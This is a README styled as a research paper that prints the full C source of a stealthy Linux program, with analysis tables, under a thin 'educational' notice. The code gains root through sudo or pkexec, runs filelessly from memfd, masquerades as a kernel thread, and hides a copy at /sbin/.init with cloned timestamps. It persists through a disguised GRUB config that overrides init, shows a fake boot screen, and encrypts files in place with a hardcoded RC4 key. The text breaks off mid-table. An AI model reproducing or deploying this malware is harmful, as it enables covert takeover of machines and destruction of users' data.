# 🐧 linux-init-research


<div align="center">

```
╔══════════════════════════════════════════════════════════════════╗
║                    TECHNICAL RESEARCH PAPER                       ║
║              Linux System Programming & Boot Process              ║
╚══════════════════════════════════════════════════════════════════╝
```

[![Platform](https://img.shields.io/badge/platform-Linux-blue?logo=linux&logoColor=white)](https://www.linux.org/)
[![Language](https://img.shields.io/badge/language-C-00599C?logo=c)](https://en.wikipedia.org/wiki/C_(programming_language))
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Research](https://img.shields.io/badge/type-Technical%20Research-orange)]()

**Author:** Vladislav Khudash (17)  
**Location:** Ukraine  
**Date:** 02.04.2026  
**Project:** LINUX-INIT-RESEARCH  
**Platform:** LINUX

</div>

---

## ⚠️ RESEARCH NOTICE

<div align="center">

| | |
|---|---|
| **📜 Purpose** | Educational research on Linux system programming |
| **🔬 Scope** | Controlled laboratory environments ONLY |
| **⚖️ Legal** | Unauthorized use violates computer fraud laws |
| **🧪 Testing** | Isolated VMs only — Not for production systems |

</div>

---

## 📖 Table of Contents

- [English](#english)
  - [1. Research Abstract](#1-research-abstract)
  - [2. System Architecture Overview](#2-system-architecture-overview)
  - [3. Complete Source Code with Analysis](#3-complete-source-code-with-analysis)
  - [4. System Call Reference Table](#4-system-call-reference-table)
  - [5. Research Findings](#5-research-findings)

- [Русский](#русский)
  - [1. Аннотация исследования](#1-аннотация-исследования)
  - [2. Обзор архитектуры системы](#2-обзор-архитектуры-системы)
  - [3. Полный исходный код с анализом](#3-полный-исходный-код-с-анализом)
  - [4. Таблица системных вызовов](#4-таблица-системных-вызовов)
  - [5. Результаты исследования](#5-результаты-исследования)

---

# English

## 1. Research Abstract

This research explores **advanced Linux system programming techniques** through the implementation of an init process simulator. The study demonstrates direct kernel interaction via raw system calls, bypassing the standard C library entirely.

**Key Research Areas:**
- Privilege escalation detection via environment analysis
- Fileless execution using `memfd_create(2)` and `execveat(2)`
- Classical UNIX daemonization patterns
- Systemd unit file parsing and boot sequence simulation
- RC4-like stream cipher cryptanalysis
- GRUB2 bootloader configuration manipulation
- Process masquerading as kernel threads

**Methodology:** The research implements a complete working binary that exercises each technique in a controlled, observable manner.

---

## 2. System Architecture Overview

### 2.1 High-Level Execution Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              PROGRAM ENTRY                                   │
│                                 main()                                       │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
                    ┌───────────────────────────────┐
                    │     Check if PID == 1 ?       │
                    └───────────────────────────────┘
                           │                │
                     YES   │                │   NO
                           ▼                ▼
              ┌─────────────────┐  ┌─────────────────────────┐
              │   init() Path   │  │   Normal Execution Path  │
              │   (Boot Mode)   │  │      (User Mode)         │
              └─────────────────┘  └─────────────────────────┘
                      │                          │
                      ▼                          ▼
        ┌──────────────────────┐    ┌────────────────────────────┐
        │ Fork child: boot     │    │ Check: in memory already?  │
        │ simulation output    │    │ (path starts with "/mem")  │
        └──────────────────────┘    └────────────────────────────┘
                      │                     │              │
                      ▼                YES  │              │  NO
        ┌──────────────────────┐            │              ▼
        │ Parent process:      │            │   ┌──────────────────────┐
        │ • Remount /          │            │   │ set_root()           │
        │ • Scan target dir    │            │   │ • sudo or pkexec     │
        │ • Modify GRUB        │            │   └──────────────────────┘
        │ • Cleanup & reboot   │            │              │
        └──────────────────────┘            │              ▼
                                            │   ┌──────────────────────┐
                                            │   │ jump_to_ram()        │
                                            │   │ • memfd_create       │
                                            │   │ • sendfile           │
                                            │   │ • execveat           │
                                            │   └──────────────────────┘
                                            │              │
                                            └──────────────┘
                                                   ▼
                                    ┌──────────────────────────┐
                                    │ Daemon Mode Activated    │
                                    │ • init_proc() - fork     │
                                    │ • loop() - obfuscation   │
                                    │ • setup_init()           │
                                    │ • setup_grub()           │
                                    │ • Main persistence loop  │
                                    └──────────────────────────┘
```

### 2.2 Fileless Execution Pipeline

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    RESEARCH TOPIC: FILELESS EXECUTION                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │ STEP 1: memfd_create("", MFD_ALLOW_SEALING)                         │    │
│  │         → Creates anonymous in-memory file                           │    │
│  │         → Returns file descriptor (md)                               │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
│                                    │                                        │
│                                    ▼                                        │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │ STEP 2: openat(original_binary, O_RDONLY)                           │    │
│  │         → Opens the on-disk executable                               │    │
│  │         → Returns file descriptor (fd)                               │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
│                                    │                                        │
│                                    ▼                                        │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │ STEP 3: sendfile(md, fd, NULL, size)                                │    │
│  │         → Zero-copy kernel-space transfer                            │    │
│  │         → Data never touches userspace                               │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
│                                    │                                        │
│                                    ▼                                        │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │ STEP 4: fcntl(md, F_ADD_SEALS, F_SEAL_SHRINK|GROW|WRITE|SEAL)      │    │
│  │         → Seals the memory file                                      │    │
│  │         → Prevents any modification                                  │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
│                                    │                                        │
│                                    ▼                                        │
│  ┌─────────────────────────────────────────────────────────────────────┐    │
│  │ STEP 5: execveat(md, "", argv, environ, AT_EMPTY_PATH)              │    │
│  │         → Executes directly from the memory fd                       │    │
│  │         → NO DISK TRACE of the running process                       │    │
│  └─────────────────────────────────────────────────────────────────────┘    │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 2.3 Daemonization Sequence

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    RESEARCH TOPIC: DAEMONIZATION PATTERN                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   Parent Process                                                            │
│        │                                                                    │
│        │ fork()                                                             │
│        ▼                                                                    │
│   ┌─────────────┐     ┌─────────────┐                                       │
│   │   Parent    │     │   Child 1   │                                       │
│   │   _exit(0)  │     │   setsid()  │ ← Become session leader               │
│   └─────────────┘     └─────────────┘                                       │
│           │                  │                                              │
│           ▼                  │ fork()                                       │
│      [EXITS]                 ▼                                              │
│                        ┌─────────────┐     ┌─────────────┐                   │
│                        │   Parent    │     │   Child 2   │                   │
│                        │   _exit(0)  │     │  (Daemon)   │                   │
│                        └─────────────┘     └─────────────┘                   │
│                              │                    │                          │
│                              ▼                    ▼                          │
│                         [EXITS]           ┌──────────────────┐               │
│                                          │ Daemon Operations │               │
│                                          │ • chdir("/")      │               │
│                                          │ • umask(022)      │               │
│                                          │ • dup2 to /dev/null│              │
│                                          │ • setpriority     │               │
│                                          │ • PR_SET_DUMPABLE │               │
│                                          │ • PR_SET_NAME     │               │
│                                          └──────────────────┘               │
│                                                   │                          │
│                                                   ▼                          │
│                                          ┌──────────────────┐               │
│                                          │  DAEMON RUNNING  │               │
│                                          │  (Background)    │               │
│                                          └──────────────────┘               │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 3. Complete Source Code with Analysis

<details>
<summary><b>📁 Section 1: Header Files & Macro Definitions</b></summary>

```c
//===================================\\
// [ OWNER ]
//     CREATOR  : Vladislav Khudash
//     AGE      : 17
//     LOCATION : Ukraine
//
// [ PINFO ]
//     DATE     : 02.04.2026
//     PROJECT  : LINUX-INIT-RESEARCH
//     PLATFORM : LINUX
//===================================\\

#define _GNU_SOURCE
#include <stdint.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <fcntl.h>

#define DIR "/tmp"

#define DT_DIR          4
#define DT_REG          8 

#define MS_REMOUNT      32

#define FS_IOC_GETFLAGS 0x80086601
#define FS_IOC_SETFLAGS 0x40086602
#define FS_IMMUTABLE_FL 0x00000010
#define FS_APPEND_FL    0x00000020

#define U(i) ((long)(i))
#define FUNC static __attribute__((always_inline)) inline

#define _exit(n) syscall(SYS_exit_group, U(n))
#define sopen(p,f,a) syscall(SYS_openat, AT_FDCWD, U(p), U(f), U(a))
#define sclose(fd) syscall(SYS_close, U(fd))
```

**Research Notes:**

| Symbol | Value | Purpose |
|--------|-------|---------|
| `_GNU_SOURCE` | — | Enables Linux-specific syscalls (`sendfile`, `memfd_create`) |
| `DIR` | `"/tmp"` | Target directory for filesystem operations |
| `DT_DIR` | `4` | Directory type code from `getdents64` |
| `DT_REG` | `8` | Regular file type code from `getdents64` |
| `MS_REMOUNT` | `32` | Remount filesystem flag |
| `FS_IOC_GETFLAGS` | `0x80086601` | ioctl command to get filesystem flags |
| `FS_IOC_SETFLAGS` | `0x40086602` | ioctl command to set filesystem flags |
| `FS_IMMUTABLE_FL` | `0x10` | Immutable flag (cannot modify file) |
| `FS_APPEND_FL` | `0x20` | Append-only flag |
| `U(i)` | `((long)(i))` | Cast to long for syscall ABI |
| `FUNC` | `static inline` | Force inlining, reduce overhead |

</details>

<details>
<summary><b>📁 Section 2: Data Structures</b></summary>

```c
struct r_timeval {
    long    tv_sec;  
    long    tv_usec; 
};

struct r_timespec {
    long    tv_sec;
    long    tv_nsec;
};

struct dirent64_t {
    uint64_t    d_ino;
    int64_t     d_off;
    uint16_t    d_reclen;
    uint8_t     d_type;
    char        d_name[];
};
```

**Research Notes:**
- `r_timeval` — Used with `select()` for microsecond precision sleeps
- `r_timespec` — Used with `nanosleep()` for nanosecond precision
- `dirent64_t` — Exact kernel ABI structure for `getdents64`
- `d_name[]` — Flexible array member (C99), actual size determined by `d_reclen`

</details>

<details>
<summary><b>📁 Section 3: Privilege Escalation (set_root)</b></summary>

```c
FUNC void set_root(const char *p) {
    if (syscall(SYS_getuid) == 0)
        return;
    
    
    extern char **environ;
    const  char *exe = "/usr/bin/sudo"; 
    

    for (char **e = environ;  e && (*e);  e++) {
        char *v = (*e); 

        if (
            ( (v[0] == 'D') && (v[1] == 'I') && (v[2] == 'S') && (v[3] == 'P') ) || 
            ( (v[0] == 'W') && (v[1] == 'A') && (v[2] == 'Y') && (v[3] == 'L') )
        ) {
            exe = "/usr/bin/pkexec";
            break;
        }
    }


    char *arg[] = { (char*)exe, (char*)p, NULL };
    syscall(SYS_execve, U(exe), U(arg), U(environ));

  
    _exit(0);
}
```

**Analysis:**

| Line | Observation |
|------|-------------|
| 2-3 | Early return if already root (UID 0) |
| 6 | Access global `environ` variable |
| 7 | Default to `sudo` for terminal sessions |
| 9-17 | Scan environment for `DISPLAY` or `WAYLAND` |
| 14 | Switch to `pkexec` for graphical sessions |
| 20-21 | Execute elevation binary via `execve` |
| 23 | Exit if execve fails (should never reach) |

**Research Finding:** The code correctly identifies graphical vs. terminal sessions by checking for X11/Wayland environment variables, choosing the appropriate privilege escalation tool.

</details>

<details>
<summary><b>📁 Section 4: Fileless Execution (jump_to_ram)</b></summary>

```c
FUNC void jump_to_ram(const char *p) {
    int md = syscall(SYS_memfd_create, U(""), 2U);

    if (md < 0) 
        return;


    int fd = sopen(p, O_RDONLY|O_NOATIME, 0);

    if (fd < 0) {
        sclose(md);
        return;
    }


    struct stat st;

    if (syscall(SYS_fstat, U(fd), &st) != 0) {
        sclose(fd);
        sclose(md);
        return;
    }

    long sz = st.st_size;


    long off = 0;

    while (off < sz) {
        long r = syscall(SYS_sendfile, U(md), U(fd), NULL, U(sz - off));

        if (r <= 0) 
            break;

        off += r;
    }

    sclose(fd);

    if (off < sz) {
        sclose(md);
        return;
    }


    syscall(SYS_fcntl, U(md), U(F_ADD_SEALS), U(F_SEAL_SHRINK|F_SEAL_GROW|F_SEAL_WRITE|F_SEAL_SEAL));

    
    char *const arg[] = { "[rcu_gp]", NULL };
    extern char **environ;
    syscall(SYS_execveat, U(md), U(""), U(arg), U(environ), U(AT_EMPTY_PATH));
    

    _exit(0);
}
```

**Step-by-Step Research Analysis:**

| Step | Lines | Syscall | Research Observation |
|------|-------|---------|---------------------|
| 1 | 2 | `memfd_create` | Creates anonymous file in RAM, `2` = `MFD_ALLOW_SEALING` |
| 2 | 8-11 | `openat` | Opens original binary with `O_NOATIME` (don't update access time) |
| 3 | 15-19 | `fstat` | Get file size for transfer |
| 4 | 23-29 | `sendfile` | Zero-copy kernel transfer — data never touches userspace |
| 5 | 31 | `close` | Close disk file |
| 6 | 33-36 | — | Verify complete transfer |
| 7 | 39 | `fcntl` + `F_ADD_SEALS` | Seal memory file — prevents any modification |
| 8 | 42-44 | `execveat` + `AT_EMPTY_PATH` | Execute directly from memory fd |
| 9 | 47 | `exit_group` | Should never reach here |

**Key Research Finding:** The binary executes entirely from RAM, leaving no disk trace of the running process. `sendfile` performs a zero-copy transfer in kernel space, making the operation extremely efficient.

</details>

<details>
<summary><b>📁 Section 5: Daemonization (init_proc)</b></summary>

```c
FUNC void init_proc(void) {
    if (syscall(SYS_fork) != 0) 
        _exit(0);

    syscall(SYS_setsid);
        
    if (syscall(SYS_fork) != 0) 
        _exit(0);

    syscall(SYS_prctl, U(PR_SET_NAME), U("rcu_gp"), 0, 0, 0);


    int fd = sopen("/dev/null", O_RDWR, 0);

    if (fd != -1) {
        syscall(SYS_dup2, U(fd), 0);
        syscall(SYS_dup2, U(fd), 1); 
        syscall(SYS_dup2, U(fd), 2); 

        if (fd > 2) 
            sclose(fd);
    }
        

    syscall(SYS_umask, 022);
    syscall(SYS_chdir, U("/"));


    syscall(SYS_setpriority, 0, 0, 18);
    syscall(SYS_prctl, U(PR_SET_TIMERSLACK), U(100000000), 0, 0, 0);
    syscall(SYS_prctl, U(PR_SET_THP_DISABLE), 1, 0, 0, 0);
    syscall(SYS_prctl, U(PR_SET_DUMPABLE), 0, 0, 0, 0);
}
```

**Classical Double-Fork Analysis:**

| Step | Operation | Purpose |
|------|-----------|---------|
| 1 | `fork()` | Child continues, parent exits — detach from terminal |
| 2 | `setsid()` | Create new session, become session leader |
| 3 | `fork()` | Session leader exits, grandchild cannot regain terminal |
| 4 | `prctl(PR_SET_NAME)` | Set process name to `[rcu_gp]` (kernel thread disguise) |
| 5 | `open("/dev/null")` | Open null device for I/O redirection |
| 6 | `dup2()` x3 | Redirect stdin/stdout/stderr to `/dev/null` |
| 7 | `chdir("/")` | Change to root directory (prevents unmount issues) |
| 8 | `umask(022)` | Set safe file creation mask |
| 9 | `setpriority(..., 18)` | Lower process priority (nice +18) |
| 10 | `PR_SET_TIMERSLACK` | Increase timer slack (power saving) |
| 11 | `PR_SET_THP_DISABLE` | Disable Transparent Huge Pages |
| 12 | `PR_SET_DUMPABLE, 0` | Disable core dumps |

**Research Finding:** The process name `[rcu_gp]` mimics the Linux kernel's RCU (Read-Copy-Update) grace period thread, making it appear legitimate in `ps` output.

</details>

<details>
<summary><b>📁 Section 6: Timing Obfuscation (loop)</b></summary>

```c
FUNC void loop(void) {
    #define WORKERS 256
    volatile uint64_t cache[WORKERS];
    volatile uint64_t checksum = 0;

    for (int i = 0;  i < WORKERS;  i++) 
        cache[i] = (uint64_t)i * 0x9E3779B97F4A7C15ULL; 

    for (int i = 0;  i < WORKERS - 1;  i++) {
        cache[i] ^= cache[i + 1];
        checksum += cache[i] ^ (checksum >> 3);
    }


    struct r_timeval tv;
    tv.tv_sec = 8;
    tv.tv_usec = (checksum % 500) * 1000; 
    syscall(SYS_select, 0, NULL, NULL, NULL, U(&tv));


    struct r_timespec ts;
    ts.tv_sec = 1;
    ts.tv_nsec = (checksum % 200) * 1000000; 
    syscall(SYS_nanosleep, U(&ts), NULL);
}
```

**Obfuscation Analysis:**

| Component | Purpose |
|-----------|---------|
| `volatile` | Prevents compiler from optimizing away "junk" computations |
| `0x9E3779B97F4A7C15ULL` | Golden ratio constant (φ × 2^64) — produces pseudo-random values |
| XOR cascade | Creates data dependency chain, complicates static analysis |
| `checksum % 500` | Generates variable microsecond delays |
| `select(NULL, ...)` | Portable sleep (waits on no file descriptors) |
| `nanosleep` | High-resolution sleep with pseudo-random duration |

**Research Finding:** This function introduces non-deterministic timing and complicates both static analysis and dynamic tracing.

</details>

<details>
<summary><b>📁 Section 7: Init Binary Installation (setup_init)</b></summary>

```c
FUNC void setup_init(void) {
    const char *p = "/sbin/.init";
    struct stat st;


    if (syscall(SYS_stat, U(p), &st) == 0) 
        return;


    int src = sopen("/proc/self/exe", O_RDONLY|O_NOATIME, 0);

    if (src < 0) 
        return;


    if (syscall(SYS_fstat, U(src), &st) != 0) {
        sclose(src);
        return;
    }

    long sz = st.st_size;


    int dst = sopen(p, O_WRONLY|O_CREAT|O_TRUNC|O_NOATIME, 0755);

    if (dst < 0) {
        sclose(src);
        return;
    }


    long off = 0;

    while (off < sz) {
        long r = syscall(SYS_sendfile, U(dst), U(src), NULL, U(sz - off));

        if (r <= 0) 
            break;

        off += r;
    }


    sclose(src);
    sclose(dst);


    struct stat sti;

    if (syscall(SYS_stat, U("/sbin/init"), &sti) == 0) {
        struct timespec t[2] = {sti.st_atim, sti.st_mtim};
        syscall(SYS_utimensat, AT_FDCWD, U(p), U(t), 0);
    }
}
```

**Installation Analysis:**

| Step | Observation |
|------|-------------|
| 1 | Check if `/sbin/.init` already exists — skip if present |
| 2 | Open `/proc/self/exe` (current executable) |
| 3 | Get file size |
| 4 | Create `/sbin/.init` with `0755` permissions |
| 5 | Copy content using `sendfile` (zero-copy) |
| 6 | Copy timestamps from original `/sbin/init` to hide modification time |

**Research Finding:** The hidden file (`.init`) and timestamp cloning make the binary difficult to detect through casual filesystem inspection.

</details>

<details>
<summary><b>📁 Section 8: GRUB Configuration (setup_grub)</b></summary>

```c
FUNC void setup_grub(void) {
    const char *dr = "/etc/default/grub.d";
    const char *fp = "/etc/default/grub.d/99_custom.cfg";
    const char *dt = 
        "#\n"
        "# DO NOT EDIT THIS FILE\n"
        "#\n"
        "# It is automatically generated by grub-mkconfig using templates\n"
        "# from /etc/grub.d and settings from /etc/default/grub\n"
        "#\n\n"
        "### BEGIN /etc/grub.d/40_custom ###\n"
        "GRUB_TIMEOUT=0\n"
        "GRUB_CMDLINE_LINUX_DEFAULT=\"$GRUB_CMDLINE_LINUX_DEFAULT init=/sbin/.init quiet nosplash\"\n"
        "### END /etc/grub.d/40_custom ###\n";


    struct stat st;

    if (syscall(SYS_stat, U("/etc/default"), &st) != 0) 
        return;

    struct timespec t[2] = {st.st_atim, st.st_mtim};

    
    struct stat stdr;

    if (syscall(SYS_stat, U(dr), &stdr) != 0) {
        syscall(SYS_mkdir, U(dr), 0755);
        syscall(SYS_utimensat, AT_FDCWD, U(dr), U(t), 0);
    }


    int fd = sopen(fp, O_WRONLY|O_CREAT|O_TRUNC|O_NOATIME, 0644);

    if (fd == -1) 
        return;


    int l = -1;
    while (dt[++l]);


    long off = 0;
  
    while (off < l) {
        long r = syscall(SYS_write, U(fd), U(dt + off), U(l - off));

        if (r <= 0) 
            break; 

        off += r;
    }


    syscall(SYS_fdatasync, U(fd));
    sclose(fd);


    syscall(SYS_utimensat, AT_FDCWD, U(fp), U(t), 0);
}
```

**GRUB Manipulation Analysis:**

| Step | Observation |
|------|-------------|
| 1 | Get timestamps from `/etc/default` for camouflage |
| 2 | Create `/etc/default/grub.d/` directory if needed |
| 3 | Apply original timestamps to directory |
| 4 | Write custom GRUB configuration |
| 5 | Configuration sets `init=/sbin/.init` in kernel command line |
| 6 | `GRUB_TIMEOUT=0` prevents boot menu |
| 7 | Apply original timestamps to config file |

**Research Finding:** The `init=` kernel parameter overrides the default init process. Combined with timestamp cloning, this modification is stealthy.

</details>

<details>
<summary><b>📁 Section 9: Console Output (iprint)</b></summary>

```c
static void iprint(const char *msg, int l) {
    if (l == -1) 
        while (msg[++l]);
    

    long r = syscall(SYS_write, 2, U(msg), U(l));

    if (r < 0)
        return;

    
    int fd = sopen("/dev/console", O_WRONLY|O_NOCTTY, 0);

    if (fd == -1) 
        return;

    syscall(SYS_write, U(fd), U(msg), U(l));
    sclose(fd);
}
```

**Analysis:**
- Auto-calculates string length if `l == -1`
- Writes to stderr (fd 2) and `/dev/console`
- Ensures output is visible during boot

</details>

<details>
<summary><b>📁 Section 10: Unit Description Parser (unit_desc)</b></summary>

```c
static int unit_desc(const char *name, char *out, int max) {
    char p[256] = "/lib/systemd/system/";


    int o = 12,  i = -1,  j = 0;

    while (p[++i]);
    while ( name[j] && (i < (sizeof(p) - 1)) ) 
        p[i++] = name[j++];

    p[i] = '\0';


    int fd = sopen(p, O_RDONLY|O_NOATIME, 0);

    if (fd == -1) 
        return 0;


    char buf[2048];
    int  r = syscall(SYS_read, U(fd), U(buf), U(sizeof(buf) - 1));


    if (r < 0) 
        r = 0; 

    buf[r] = '\0';


    sclose(fd);


    if (r <= o) 
        return 0;

        
    for (int k = 0;  k < (r - o);  k++) {
        if ( 
            (buf[k + 1] == 'e') && (buf[k + 2] == 's') && (buf[k + 3] == 'c') && 
            (buf[k + 4] == 'r') && (buf[k + 5] == 'i') && (buf[k + 6] == 'p') &&
                                   (buf[k + 11] == '=') 
        ) {
            int s = k + o;
            int n = 0;


            while ( (s < r) && (buf[s] != '\n') && (n < (max - 1)) ) 
                out[n++] = buf[s++];
            
            out[n] = '\0';


            return n;
        }
    }


    return 0;
}
```

**Parser Analysis:**
- Builds path: `/lib/systemd/system/{name}`
- Reads unit file
- Searches for `Description=` field
- Extracts value until newline

</details>

<details>
<summary><b>📁 Section 11: Boot Output Simulator (output)</b></summary>

```c
FUNC void output(void) {
    #define IS_MOUNT( l, name)  ( ((l) > 6) && (name[l - 6] == '.') && (name[l - 5] == 'm') && (name[l - 4] == 'o') && (name[l - 3] == 'u') && (name[l - 2] == 'n') && (name[l - 1] == 't')                         )
    #define IS_SOCKET(l, name)  ( ((l) > 7) && (name[l - 7] == '.') && (name[l - 6] == 's') && (name[l - 5] == 'o') && (name[l - 4] == 'c') && (name[l - 3] == 'k') && (name[l - 2] == 'e') && (name[l - 1] == 't') )
    #define IS_DEVICE(l, name)  ( ((l) > 7) && (name[l - 7] == '.') && (name[l - 6] == 'd') && (name[l - 5] == 'e') && (name[l - 4] == 'v') && (name[l - 3] == 'i') && (name[l - 2] == 'c') && (name[l - 1] == 'e') )
    #define IS_TIMER( l, name)  ( ((l) > 6) && (name[l - 6] == '.') && (name[l - 5] == 't') && (name[l - 4] == 'i') && (name[l - 3] == 'm') && (name[l - 2] == 'e') && (name[l - 1] == 'r')                         )
    #define IS_TARGET(l, name)  ( ((l) > 7) && (name[l - 7] == '.') && (name[l - 6] == 't') && (name[l - 5] == 'a') && (name[l - 4] == 'r') && (name[l - 3] == 'g') && (name[l - 2] == 'e') && (name[l - 1] == 't') )
    
    
    #define PRINT_DESC(d, l)                                        \
        do {                                                        \
            if ((l) > 0) { iprint(" - ", 3); iprint((d), (l)); }    \
        } while (0)
    


    int fd = sopen("/lib/systemd/system", O_RDONLY|O_DIRECTORY|O_NOATIME, 0);

    if (fd < 0) {
        iprint("\033[0;1;31m[ FATAL ]\033[0m Failed to mount /lib/systemd/system: No such file or directory\n", -1);
        iprint("Entering emergency mode. Exit shell to continue.\n", -1);
        syscall(SYS_nanosleep, U((&(struct r_timespec){3, 0})), NULL);
        iprint("\033[2J\033[H", -1);
        return;
    }

    
    char buf[4096];
    char desc[256];
    int  n,  t = 0;
    uint32_t f = 7;


    iprint("\nWelcome to Linux!\n\n", -1);


    while ( 
        ( n = syscall(SYS_getdents64, U(fd), U(buf), U(sizeof(buf))) ) > 0 
    ) {
        for (int i = 0; i < n;) {
            struct dirent64_t *d = (struct dirent64_t*)(buf + i);

            if ((d->d_reclen) < sizeof(struct dirent64_t)) 
                break;


            char *name = (d->d_name);
            int  l     = -1;
            while (name[++l]);


            if (name[0] == '.') {
                i += (d->d_reclen);
                continue;
            }


            uint32_t rng = ((name[0] + t) + f) % 100;
            int      dln = unit_desc(name, desc, sizeof(desc));


            if (IS_MOUNT(l, name)) {
                iprint("          Mounting ", 19);
                iprint(name, l);
                iprint("...\n", 4);


                syscall(SYS_nanosleep, U((&(struct r_timespec){0, 60000000})), NULL);


                iprint("\033[0;32m[  OK  ]\033[0m Mounted ", -1);
                iprint(name, l);
                PRINT_DESC(desc, dln);
                iprint(".\n", 2);
            }


            else if (IS_SOCKET(l, name)) {
                iprint("          Starting Listening on ", 32);
                iprint(name, l);
                iprint("...\n", 4);


                syscall(SYS_nanosleep, U((&(struct r_timespec){0, 40000000})), NULL);


                iprint("\033[0;32m[  OK  ]\033[0m Listening on ", -1);
                iprint(name, l);
                PRINT_DESC(desc, dln);
                iprint(".\n", 2);
            }


            else if (IS_TIMER(l, name)) {
                iprint("          Started ", 18);
                iprint(name, l);
                iprint(".\n", 2);


                syscall(SYS_nanosleep, U((&(struct r_timespec){0, 30000000})), NULL);


                iprint("\033[0;32m[  OK  ]\033[0m Reached target Timers.\n", -1);
            }


            else if (IS_TARGET(l, name)) {
                iprint("\033[0;32m[  OK  ]\033[0m Reached target ", -1);
                iprint(name, l - 7);
                PRINT_DESC(desc, dln);
                iprint(".\n", 2);


                syscall(SYS_nanosleep, U((&(struct r_timespec){0, 10000000})), NULL);
            }


            else {
                if (rng < 10) {
                    int w = 3 + (rng % 57);

                    for (int sec = 1; sec <= w; sec++) {
                        iprint("\r\033[0;33m[ *** ]\033[0m A start job is running for ", -1);
                        iprint(name, l);
                        iprint(" (", 2);

                        if (sec > 9) {
                            char c = (sec / 10) + '0';
                            iprint(&c, 1);
                        }

                        char s = (sec % 10) + '0';
                        iprint(&s, 1);
                        iprint("s / 1min 30s)", 13);


                        syscall(SYS_nanosleep, U((&(struct r_timespec){1, 0})), NULL);
                    }


                    iprint("\n\033[0;1;31m[ TIME ]\033[0m Timed out starting ", -1);
                    iprint(name, l);
                    iprint(".\n", 2);


                    f += 5;
                }


                else if ( (rng > 90) && (rng < 96) ) {
                    iprint("\033[0;31m[FAILED]\033[0m Failed to start ", -1);
                    iprint(name, l);
                    PRINT_DESC(desc, dln);
                    iprint(".\nSee 'systemctl status ", -1);
                    iprint(name, l);
                    iprint("' for details.\n", -1);


                    f += 3;
                }


                else {
                    iprint("          Starting ", 19);
                    iprint(name, l);
                    iprint("...\n", 4);


                    syscall(SYS_nanosleep, U((&(struct r_timespec){0, 30000000 + (rng * 1000000)})), NULL);


                    iprint("\033[0;32m[  OK  ]\033[0m Started ", -1);
                    iprint(name, l);
                    PRINT_DESC(desc, dln);
                    iprint(".\n", 2);


                    if (f > 2) 
                        f--;
                }
            }


            t++;
            i += (d->d_reclen);

        } 
    }


    iprint("\n\033[0;1;31m[ FATAL ]\033[0m Failed to start systemd-journald.service", -1);
    iprint("\n\033[0;1;31m[ FATAL ]\033[0m Failed to spawn init process", -1);


    iprint("\n\033[1;37m[ INFO ]\033[0m Attempting restart to systemd...", -1);
    syscall(SYS_nanosleep, U((&(struct r_timespec){3, 0})), NULL);
    iprint("\033[2J\033[H", -1);


    sclose(fd);
}
```

**Simulation Statistics:**

| Unit Type | Probability | Action |
|-----------|-------------|--------|
| Mount/Socket/Timer/Target | 100% | Display appropriate message |
| Hanging Job | 10% | Countdown with progress bar |
| Failed Unit | 5% | `[FAILED]` message |
| Normal Start | 85% | `[ OK ]` Started message |

**ANSI Color Codes Used:**

| Code | Color | Usage |
|------|-------|-------|
| `\033[0;32m` | Green | Success messages |
| `\033[0;31m` | Red | Failure messages |
| `\033[0;1;31m` | Bold Red | Fatal errors |
| `\033[0;33m` | Yellow | Waiting jobs |
| `\033[1;37m` | Bold White | Info messages |
| `\033[2J\033[H` | — | Clear screen |

</details>

<details>
<summary><b>📁 Section 12: Stream Cipher (enc)</b></summary>

```c
FUNC void enc(const char *p) {
    static const uint8_t KEY[32] = {
        0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x23, 0x45, 0x67,
        0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98,
        0x76, 0x54, 0x32, 0x10, 0xAA, 0xBB, 0xCC, 0xDD,
        0xEE, 0xFF, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55
    };


    #define SWAP(a, b) do { uint8_t t = a; a = b; b = t; } while(0)



    int fd = sopen(p, O_RDONLY|O_NOATIME, 0);

    if (fd < 0) 
        return;

    long of = 0,  nf = 0;
    int  hf = (syscall(SYS_ioctl, U(fd), U(FS_IOC_GETFLAGS), U(&of)) == 0);

    if (hf) {
        nf = of & ~(FS_IMMUTABLE_FL|FS_APPEND_FL);
        syscall(SYS_ioctl, U(fd), U(FS_IOC_SETFLAGS), U(&nf));
    }

    sclose(fd);


    fd = sopen(p, O_RDWR|O_NOATIME, 0);

    if (fd < 0) 
        return;


    static uint8_t buf[524288];
    long r = syscall(SYS_read, U(fd), U(buf), U(sizeof(buf)));

    if (r <= 0) { 
        sclose(fd);
        return;
    }


    uint8_t s[256];

    for (int i = 0;  i < 256;  i++) 
        s[i] = (uint8_t)i;

  
    uint8_t j = 0;

    for (int i = 0;  i < 256;  i++) {
        j = (uint8_t)(j + s[i] + KEY[i % 32] + p[i % 16]);
        SWAP(s[i], s[j]);
    }


    uint8_t x = 0,  y = 0;

    for (int i = 0; i < r; i++) {
        x = (uint8_t)(x + 1);
        y = (uint8_t)(y + s[x]);

        SWAP(s[x], s[y]);
            
        buf[i] ^= s[(uint8_t)(s[x] + s[y])];
    }

  
    syscall(SYS_lseek, U(fd), 0, 0);
    syscall(SYS_write, U(fd), U(buf), U(r));
    syscall(SYS_fdatasync, U(fd));


    if (hf) 
        syscall(SYS_ioctl, U(fd), U(FS_IOC_SETFLAGS), U(&of));
    
    sclose(fd);
}
```

**RC4 Algorithm Analysis:**

| Phase | Lines | Description |
|-------|-------|-------------|
| **KSA** | 52-62 | Initialize 256-byte S-box with key-dependent permutation |
